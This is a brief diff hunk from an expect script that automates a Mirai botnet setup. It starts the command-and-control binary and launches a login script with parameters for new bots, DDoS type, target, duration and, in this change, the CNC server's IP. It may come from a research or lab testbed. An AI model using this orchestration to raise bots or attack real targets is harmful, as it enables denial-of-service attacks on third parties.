@@ -45,7 +45,7 @@ send "nohup debug/cnc &\r"
 expect "output to 'nohup.out'"
 send "\r"
 expect "*$mirai_path# "
-send "nohup $path/./$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path &\r"
+send "nohup $path/./$login_sh $numOfNewBots $DDoSType $targetedDDoS $dur $path $CNC_ip &\r"
 expect "output to 'nohup.out'"
 send "\r"
 
